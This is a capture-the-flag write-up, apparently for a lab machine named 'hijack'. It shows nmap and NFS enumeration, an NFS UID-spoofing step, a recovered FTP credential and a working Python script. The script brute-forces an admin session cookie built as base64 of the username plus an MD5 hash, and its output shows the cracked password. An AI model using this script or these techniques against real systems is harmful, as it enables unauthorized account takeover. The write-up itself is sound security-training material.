## Service scanning 
```
> nmap -sC -sV -p$(nmap --min-rate=2000 -T4 -p- $IP | grep '^[0-9]' | cut -d '/' -f 1 | tr '\n' ',' | sed 's/,$//') $IP -oN tcp.txt
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-01 01:59 EDT
Nmap scan report for 10.10.106.203
Host is up (0.23s latency).

PORT      STATE SERVICE  VERSION
21/tcp    open  ftp      vsftpd 3.0.3
22/tcp    open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 94:ee:e5:23:de:79:6a:8d:63:f0:48:b8:62:d9:d7:ab (RSA)
|   256 42:e9:55:1b:d3:f2:04:b6:43:b2:56:a3:23:46:72:c7 (ECDSA)
|_  256 27:46:f6:54:44:98:43:2a:f0:59:ba:e3:b6:73:d3:90 (ED25519)
80/tcp    open  http     Apache httpd 2.4.18 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Home
111/tcp   open  rpcbind  2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100005  1,2,3      44411/tcp6  mountd
|   100005  1,2,3      45414/udp   mountd
|   100005  1,2,3      51283/tcp   mountd
|   100005  1,2,3      59747/udp6  mountd
|   100227  2,3         2049/tcp   nfs_acl
|   100227  2,3         2049/tcp6  nfs_acl
|   100227  2,3         2049/udp   nfs_acl
|_  100227  2,3         2049/udp6  nfs_acl
2049/tcp  open  nfs_acl  2-3 (RPC #100227)
37139/tcp open  nlockmgr 1-4 (RPC #100021)
49406/tcp open  mountd   1-3 (RPC #100005)
51283/tcp open  mountd   1-3 (RPC #100005)
54723/tcp open  mountd   1-3 (RPC #100005)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.33 seconds
```
## Enumerating NFS 
```
> rpcinfo -p hijack.thm
   program vers proto   port  service
    100000    4   tcp    111  portmapper
    100000    3   tcp    111  portmapper
    100000    2   tcp    111  portmapper
    100000    4   udp    111  portmapper
    100000    3   udp    111  portmapper
    100000    2   udp    111  portmapper
    100005    1   udp  51740  mountd
    100005    1   tcp  49406  mountd
    100005    2   udp  60141  mountd
    100005    2   tcp  54723  mountd
    100005    3   udp  45414  mountd
    100005    3   tcp  51283  mountd
    100003    2   tcp   2049  nfs
    100003    3   tcp   2049  nfs
    100003    4   tcp   2049  nfs
    100227    2   tcp   2049  nfs_acl
    100227    3   tcp   2049  nfs_acl
    100003    2   udp   2049  nfs
    100003    3   udp   2049  nfs
    100003    4   udp   2049  nfs
    100227    2   udp   2049  nfs_acl
    100227    3   udp   2049  nfs_acl
    100021    1   udp  37189  nlockmgr
    100021    3   udp  37189  nlockmgr
    100021    4   udp  37189  nlockmgr
    100021    1   tcp  37139  nlockmgr
    100021    3   tcp  37139  nlockmgr
    100021    4   tcp  37139  nlockmgr
```

## Adding user permission
```bash
~> sudo useradd l0n3m4n -u 1003 -m -s /bin/bash 
```
## show user uid 
```bash
ls -al /tmp/nfs/mnt/share
```
## FTP credential
```bash
ftpuser:W3stV1rg1n14M0un741nM4m4
```

## Checking extracted txt files 
```bash
To all employees, this is "admin" speaking,
i came up with a safe list of passwords that you all can use on the site, these passwords don't appear on any wordlist i tested so far, so i encourage you to use them, even me i'm using one of those.

NOTE To rick : good job on limiting login attempts, it works like a charm, this will prevent any future brute forcing.
```

## Session Cookie 
```
l0n3m4n:ceb6c970658f31504a901b89dcd3e461
```

## Vulnerability analysis
after creating account found out PHPSESSID= converted into  base64 strings 
```bash
GET /index.php HTTP/1.1
Host: 10.10.106.203
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.106.203/login.php
Connection: keep-alive
Cookie: PHPSESSID=bDBuM200bjpjZWI2Yzk3MDY1OGYzMTUwNGE5MDFiODlkY2QzZTQ2MQ%3D%3D
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```
## Docoding into base64  
```bash
> echo "bDBuM200bjpjZWI2Yzk3MDY1OGYzMTUwNGE5MDFiODlkY2QzZTQ2MQ"  | base64 -d
l0n3m4n:ceb6c970658f31504a901b89dcd3e461%  
```
## Checking hashtype 
```bash
HASH: ceb6c970658f31504a901b89dcd3e461

Possible Hashs:
[+] MD5
[+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))
```
## Bruteforce Administration form  
brute-forcing a web application's cookie-based login mechanism by hashing passwords with MD5, base64-encoding them in a PHPSESSID, and checking response lengths to detect a successful login.
```py
import hashlib
import base64
import requests

# Configuration
URL = "http://target-website.com"  # Change to the actual URL
password_file = "/home/kali/ftp_password.txt"
username = "admin"

# Get the baseline (unauthenticated) page content length
page_content = requests.get(URL).text

# Read password list and iterate
with open(password_file, 'r') as file:
    for line in file:
        password = line.strip()
        
        # Step 1: MD5 hash
        md5_hash = hashlib.md5(password.encode('utf-8')).hexdigest().encode('utf-8')
        
        # Step 2: Create string "admin:<hash>"
        combo = f"{username}:".encode() + md5_hash
        
        # Step 3: Base64 encode it
        b64_cookie = base64.b64encode(combo).decode()
        
        # Step 4: Send request with forged cookie
        headers = {"Cookie": f"PHPSESSID={b64_cookie}"}
        response = requests.get(URL, headers=headers)

        # Step 5: Check if login succeeded by comparing content length
        if len(response.text) > len(page_content):
            print(f"[✅] Password found: {password}")
            print(f"[🍪] Valid Cookie: PHPSESSID={b64_cookie}")
            break
        else:
            print(f"[❌] Tried: {password}")

```

## Output 
```bash
>  python3 hijack.py 
[❌] Tried: DA67As4HHJGcP5JNEEq7
[❌] Tried: E7DRgdETSrvmtZubUFj7
....
...
[❌] Tried: nWtX7JBvLAV2HjvdT7Up
[❌] Tried: wYaGwFEWgD6MM3rjBZY3
[❌] Tried: 4TymWfYFKun9ne9vbJnG
[❌] Tried: cT6GF9MHvSCtrpbp7UYf
[✅] Password found: uDh3jCQsdcuLhjVkAy5x
[🍪] Valid Cookie: PHPSESSID=YWRtaW46ZDY1NzNlZDczOWFlN2ZkZmIzY2VkMTk3ZDk0ODIwYTU=
```
## Into base64 
```bash
> echo "YWRtaW46ZDY1NzNlZDczOWFlN2ZkZmIzY2VkMTk3ZDk0ODIwYTU="| base64 -d
admin:d6573ed739ae7fdfb3ced197d94820a5%       
```